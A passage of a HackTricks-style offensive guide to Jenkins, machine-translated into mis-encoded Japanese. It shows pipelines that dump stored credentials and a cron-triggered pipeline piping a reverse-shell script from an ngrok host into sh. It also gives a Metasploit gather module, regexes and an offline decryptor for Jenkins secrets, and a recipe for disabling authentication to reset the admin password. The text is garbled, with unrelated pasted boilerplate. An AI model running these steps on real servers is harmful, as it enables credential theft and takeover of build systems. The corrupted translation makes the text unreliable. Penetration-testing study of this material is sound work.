è³‡æ ¼æƒ…å ±ã¯ã€ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ï¼ˆ`/credentials/`ï¼‰ã¾ãŸã¯ç‰¹å®šã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆï¼ˆ`/job/<project-name>/configure`ï¼‰ã«ã‚¹ã‚³ãƒ¼ãƒ—ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å¤–éƒ¨ã«æµå‡ºã•ã›ã‚‹ã«ã¯ã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å«ã‚€ã™ã¹ã¦ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’å°‘ãªãã¨ã‚‚ä¾µå®³ã—ã€ã‚«ã‚¹ã‚¿ãƒ /æ”¹ã–ã‚“ã•ã‚ŒãŸãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã‚‚ã†1ã¤ã®å•é¡Œã¯ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ç’°å¢ƒå†…ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ã«ã¯ã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®åå‰ã¨ã‚¿ã‚¤ãƒ—ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚ãŸã¨ãˆã°ã€`usernamePassword`ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’`string`ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ã—ã¦ãƒ­ãƒ¼ãƒ‰ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€æ¬¡ã®ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã™ï¼š
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
ä»¥ä¸‹ã¯ã€ä¸€éƒ¨ã®ä¸€èˆ¬çš„ãªç§˜å¯†ã‚¿ã‚¤ãƒ—ã‚’èª­ã¿è¾¼ã‚€æ–¹æ³•ã§ã™ï¼š

```markdown
## Load Secrets from Files

To load secrets from files, you can use the following methods:

### SSH Private Key

To load an SSH private key from a file, use the following command:

```bash
cat /path/to/private_key
```

### API Keys

To load an API key from a file, use the following command:

```bash
cat /path/to/api_key
```

### Passwords

To load a password from a file, use the following command:

```bash
cat /path/to/password
```

## Load Secrets from Environment Variables

To load secrets from environment variables, you can use the following methods:

### SSH Private Key

To load an SSH private key from an environment variable, use the following command:

```bash
echo $SSH_PRIVATE_KEY
```

### API Keys

To load an API key from an environment variable, use the following command:

```bash
echo $API_KEY
```

### Passwords

To load a password from an environment variable, use the following command:

```bash
echo $PASSWORD
```
```
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
ã“ã®ãƒšãƒ¼ã‚¸ã®æœ€å¾Œã«ã¯ã€**ã™ã¹ã¦ã®è³‡æ ¼æƒ…å ±ã®ã‚¿ã‚¤ãƒ—**ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**ä¸€åº¦ã«ã™ã¹ã¦ã®ç§˜å¯†æƒ…å ±ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹**æœ€è‰¯ã®æ–¹æ³•ã¯ã€**Jenkins**ãƒã‚·ãƒ³ã‚’**ä¾µå®³**ã™ã‚‹ã“ã¨ã§ã™ï¼ˆä¾‹ãˆã°**çµ„ã¿è¾¼ã¿ãƒãƒ¼ãƒ‰**ã«é€†ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ï¼‰ã“ã¨ã§ã€ãã®å¾Œã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§**ãƒã‚¹ã‚¿ãƒ¼ã‚­ãƒ¼**ã¨**æš—å·åŒ–ã•ã‚ŒãŸç§˜å¯†æƒ…å ±**ã‚’**æ¼æ´©**ã•ã›ã¦å¾©å·åŒ–ã™ã‚‹ã“ã¨ã§ã™ã€‚\
ã“ã‚Œã«ã¤ã„ã¦ã¯ã€[ãƒãƒ¼ãƒ‰ã¨ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³](./#nodes-and-agents)ã¨[ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³](./#post-exploitation)ã§è©³ã—ãèª¬æ˜ã—ã¾ã™ã€‚
{% endhint %}

### ãƒˆãƒªã‚¬ãƒ¼

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ã«ã‚ˆã‚‹ã¨ã€`triggers`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯ã€**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ãŒå†ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹è‡ªå‹•åŒ–æ–¹æ³•**ã‚’å®šç¾©ã—ã¾ã™ã€‚GitHubã‚„BitBucketãªã©ã®ã‚½ãƒ¼ã‚¹ã¨çµ±åˆã•ã‚ŒãŸãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®å ´åˆã€`triggers`ã¯å¿…è¦ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ãƒ™ãƒ¼ã‚¹ã®çµ±åˆã¯æ—¢ã«å­˜åœ¨ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ç¾åœ¨åˆ©ç”¨å¯èƒ½ãªãƒˆãƒªã‚¬ãƒ¼ã¯ã€`cron`ã€`pollSCM`ã€`upstream`ã§ã™ã€‚

cronã®ä¾‹ï¼š
```bash
triggers { cron('H */4 * * 1-5') }
```
ä»–ã®ä¾‹ã«ã¤ã„ã¦ã¯ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### ãƒãƒ¼ãƒ‰ã¨ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ

**Jenkinsã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹**ã«ã¯ã€**ç•°ãªã‚‹ãƒã‚·ãƒ³ã§å®Ÿè¡Œã•ã‚Œã‚‹ã•ã¾ã–ã¾ãªã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ**ãŒå­˜åœ¨ã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚æ”»æ’ƒè€…ã®è¦³ç‚¹ã‹ã‚‰ã¯ã€ç•°ãªã‚‹ãƒã‚·ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ã€ç›—ã¾ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹**ç•°ãªã‚‹ã‚¯ãƒ©ã‚¦ãƒ‰ã®è³‡æ ¼æƒ…å ±**ã‚„ã€ä»–ã®ãƒã‚·ãƒ³ã‚’æ‚ªç”¨ã—ã¦æ”»æ’ƒã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã§ãã‚‹**ç•°ãªã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æ„å‘³ã—ã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€åŸºæœ¬æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

`/computer/`ã§**æ§‹æˆã•ã‚ŒãŸãƒãƒ¼ãƒ‰**ã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚é€šå¸¸ã€\*\*`Built-In Node` \*\*ï¼ˆJenkinsã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ãƒãƒ¼ãƒ‰ï¼‰ã¨ãã®ä»–ã®ãƒãƒ¼ãƒ‰ãŒè¦‹ã¤ã‹ã‚‹ã§ã—ã‚‡ã†ï¼š

![](<../../.gitbook/assets/image (25).png>)

**Built-Inãƒãƒ¼ãƒ‰ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ã¯ç‰¹ã«èˆˆå‘³æ·±ã„**ã§ã™ã€‚ãªãœãªã‚‰ã€ãã‚Œã«ã¯Jenkinsã®æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã§**ãƒ“ãƒ«ãƒˆã‚¤ãƒ³ã®Jenkinsãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ã‚’ç¤ºã™ã«ã¯ã€æ¬¡ã®è¨­å®šã‚’ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³å†…ã«æŒ‡å®šã—ã¾ã™ï¼š
```bash
pipeline {
agent {label 'built-in'}
```
### å®Œå…¨ãªä¾‹

ç‰¹å®šã®ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã§ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã€cronãƒˆãƒªã‚¬ãƒ¼ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã¨ã‚¹ãƒ†ãƒ¼ã‚¸ã®ç’°å¢ƒå¤‰æ•°ã‚’ä½¿ç”¨ã—ã€ã‚¹ãƒ†ãƒƒãƒ—ã§2ã¤ã®å¤‰æ•°ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã€é€†ã‚·ã‚§ãƒ«ã‚’é€ä¿¡ã™ã‚‹ã€‚
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
Metasploit is a powerful framework for post-exploitation activities. It provides a wide range of modules and tools that can be used to further exploit a compromised system. Some of the key features of Metasploit include:

- **Payloads**: Metasploit offers a variety of payloads that can be used to deliver malicious code to a target system. These payloads can be customized to suit specific needs, such as establishing a reverse shell or executing arbitrary commands.

- **Exploits**: Metasploit includes a large collection of exploits for various vulnerabilities. These exploits can be used to gain unauthorized access to a target system and escalate privileges.

- **Post-exploitation Modules**: Metasploit provides a set of post-exploitation modules that can be used to gather information, manipulate the compromised system, and maintain persistence. These modules can be used to perform tasks such as extracting passwords, capturing screenshots, and pivoting to other systems on the network.

- **Meterpreter**: Meterpreter is a powerful payload included in Metasploit that provides an interactive shell on the target system. It allows for advanced post-exploitation activities, such as file system manipulation, process management, and network reconnaissance.

Metasploit is a versatile tool that can be used by both ethical hackers and malicious actors. It is important to use Metasploit responsibly and within the boundaries of the law.
```
msf> post/multi/gather/jenkins_gather
```
### Jenkinsã®ç§˜å¯†

ååˆ†ãªæ¨©é™ãŒã‚ã‚‹å ´åˆã€`/credentials/`ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ç§˜å¯†ã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã ã—ã€ã“ã‚Œã¯`credentials.xml`ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®ç§˜å¯†ã®ã¿ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ãŒã€**ãƒ“ãƒ«ãƒ‰æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«**ã«ã¯ã•ã‚‰ã«**ä»–ã®è³‡æ ¼æƒ…å ±**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

å„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®æ§‹æˆã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆã€ãƒªãƒã‚¸ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹**è³‡æ ¼æƒ…å ±ï¼ˆç§˜å¯†ï¼‰ã®åå‰**ã‚„**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä»–ã®è³‡æ ¼æƒ…å ±**ã‚‚ãã“ã§ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](<../../.gitbook/assets/image (9) (1) (1).png>)

#### Groovyã‹ã‚‰

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ãƒ‡ã‚£ã‚¹ã‚¯ã‹ã‚‰

ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯Jenkinsã®ç§˜å¯†ã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ï¼š

* secrets/master.key
* secrets/hudson.util.Secret

ã“ã®ã‚ˆã†ãª**ç§˜å¯†ã¯é€šå¸¸ä»¥ä¸‹ã®å ´æ‰€ã«è¦‹ã¤ã‹ã‚Šã¾ã™**ï¼š

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ä»¥ä¸‹ã¯ãã‚Œã‚‰ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã®æ­£è¦è¡¨ç¾ã§ã™ï¼š
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§Jenkinsã®ç§˜å¯†ã‚’å¾©å·åŒ–ã™ã‚‹

ã‚‚ã—ã€**ç§˜å¯†ã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã«å¿…è¦ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ€ãƒ³ãƒ—ã—ãŸ**å ´åˆã¯ã€[**ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py)ã‚’ä½¿ç”¨ã—ã¦ã€**ãã‚Œã‚‰ã®ç§˜å¯†ã‚’å¾©å·åŒ–**ã—ã¦ãã ã•ã„ã€‚
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovyã‹ã‚‰Jenkinsã®ç§˜å¯†ã‚’å¾©å·åŒ–ã™ã‚‹

If you have access to the Jenkins master server, you can decrypt the secrets stored in Jenkins using Groovy scripts. This can be useful during a penetration test or security assessment to uncover sensitive information.

ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã£ã¦ã€Jenkinsã®ãƒã‚¹ã‚¿ãƒ¼ã‚µãƒ¼ãƒãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦Jenkinsã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ç§˜å¯†ã‚’å¾©å·åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ä¸­ã«ã€æ©Ÿå¯†æƒ…å ±ã‚’æ˜ã‚‰ã‹ã«ã™ã‚‹ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™ã€‚

1. Log in to the Jenkins master server.

   Jenkinsã®ãƒã‚¹ã‚¿ãƒ¼ã‚µãƒ¼ãƒãƒ¼ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¾ã™ã€‚

2. Navigate to the "Script Console" page.

   ã€Œã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã€ãƒšãƒ¼ã‚¸ã«ç§»å‹•ã—ã¾ã™ã€‚

3. Enter the following Groovy script to decrypt the secrets:

   ä»¥ä¸‹ã®Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å…¥åŠ›ã—ã¦ã€ç§˜å¯†ã‚’å¾©å·åŒ–ã—ã¾ã™ã€‚

   ```groovy
   import jenkins.util.Secret

   def secret = Secret.decrypt("<ENCRYPTED_SECRET>")
   println(secret.getPlainText())
   ```

   Replace `<ENCRYPTED_SECRET>` with the encrypted secret you want to decrypt.

   `<ENCRYPTED_SECRET>`ã‚’å¾©å·åŒ–ã—ãŸã„æš—å·åŒ–ã•ã‚ŒãŸç§˜å¯†ã§ç½®ãæ›ãˆã¾ã™ã€‚

4. Click on the "Run" button to execute the script.

   ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€Œå®Ÿè¡Œã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚

5. The decrypted secret will be printed in the console output.

   å¾©å·åŒ–ã•ã‚ŒãŸç§˜å¯†ã¯ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«å‡ºåŠ›ã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

Note: This method requires access to the Jenkins master server and the necessary permissions to execute Groovy scripts. Use this technique responsibly and only on systems you have permission to access.

æ³¨æ„ï¼šã“ã®æ–¹æ³•ã¯Jenkinsã®ãƒã‚¹ã‚¿ãƒ¼ã‚µãƒ¼ãƒãƒ¼ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¨ã€Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œæ¨©é™ãŒå¿…è¦ã§ã™ã€‚ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯è²¬ä»»ã‚’æŒã£ã¦ä½¿ç”¨ã—ã€ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ãŒã‚ã‚‹ã‚·ã‚¹ãƒ†ãƒ ã®ã¿ã§ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### æ–°ã—ã„ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä½œæˆ

1. `/var/lib/jenkins/config.xml`ã¾ãŸã¯`C:\Program Files (x86)\Jenkis\`ã«ã‚ã‚‹Jenkinsã®config.xmlãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚
2. `<useSecurity>true</useSecurity>`ã¨ã„ã†å˜èªã‚’æ¤œç´¢ã—ã€å˜èª\*\*`true` \*\*ã‚’**`false`**ã«å¤‰æ›´ã—ã¾ã™ã€‚
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
3. **Jenkins**ã‚µãƒ¼ãƒãƒ¼ã‚’**å†èµ·å‹•**ã—ã¾ã™ï¼š`service jenkins restart`
4. ã‚‚ã†ä¸€åº¦Jenkinsãƒãƒ¼ã‚¿ãƒ«ã«ç§»å‹•ã—ã€ä»Šå›ã¯Jenkinsã¯è³‡æ ¼æƒ…å ±ã‚’è¦æ±‚ã—ã¾ã›ã‚“ã€‚**"Manage Jenkins"**ã«ç§»å‹•ã—ã¦**ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å†è¨­å®š**ã—ã¾ã™ã€‚
5. è¨­å®šã‚’`<useSecurity>true</useSecurity>`ã«å¤‰æ›´ã—ã€Jenkinsã‚’**å†èµ·å‹•**ã—ã¦**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£**ã‚’**æœ‰åŠ¹åŒ–**ã—ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å—ã‘å–ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®githubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
